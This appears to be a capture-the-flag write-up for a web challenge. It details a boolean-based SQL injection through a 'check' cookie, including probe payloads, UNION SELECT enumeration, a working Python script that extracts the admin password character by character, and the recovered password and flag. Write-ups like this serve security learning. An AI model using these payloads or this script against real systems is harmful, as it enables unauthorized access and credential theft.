web
## 1. Initial Enumeration
- The website sets a cookie named `check` with a hexadecimal value.
- Observation showed that certain `check` cookie values caused a "All is well." message to appear in the footer, while others did not.
- Specifically, if the cookie value started with a digit (1-9), the message appeared. If it started with a letter, it did not.

## 2. Vulnerability Discovery (SQL Injection)
The behavior suggested that the cookie value was being used in a SQL query.
- Testing `check=1' OR '1'='1` returned "All is well." (True)
- Testing `check=1' AND '1'='2` resulted in an empty footer. (False)
This confirmed a boolean-based SQL injection vulnerability in the `check` cookie.

## 3. Database Exploration
Using `UNION SELECT` to determine the query structure and database contents:
- `check=nonexistent' UNION SELECT 1,2 --` confirmed the original query selects 2 columns.
- `check=nonexistent' UNION SELECT 1,2 FROM users --` confirmed the existence of a `users` table.
- Verified columns `username` and `password` exist in the `users` table.
- Confirmed the user `admin` exists.

## 4. Exploitation (Password Extraction)
A Python script was used to extract the password for the `admin` user character-by-character using the boolean-based injection:

```python
import requests

url = "http://34.14.220.175:7001/"
password = ""

for i in range(1, 16):
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=":
        cookie = {"check": f"nonexistent' UNION SELECT 1,2 FROM users WHERE username='admin' AND substr(password,{i},1)='{c}' --"}
        r = requests.get(url, cookies=cookie)
        if "All is well." in r.text:
            password += c
            break
print(f"Admin Password: {password}")
```

Extracted Password: `sh@zCTF@_bsqlii`

## 5. Capturing the Flag
- Navigated to the hidden admin panel at `http://34.14.220.175:7001/admin`.
- Logged in with credentials `admin:sh@zCTF@_bsqlii`.
- The flag was displayed upon successful login.

**Flag:** `ShaZ{bsql!_fl4g_extr4t10n_d0n3_eas1ly}`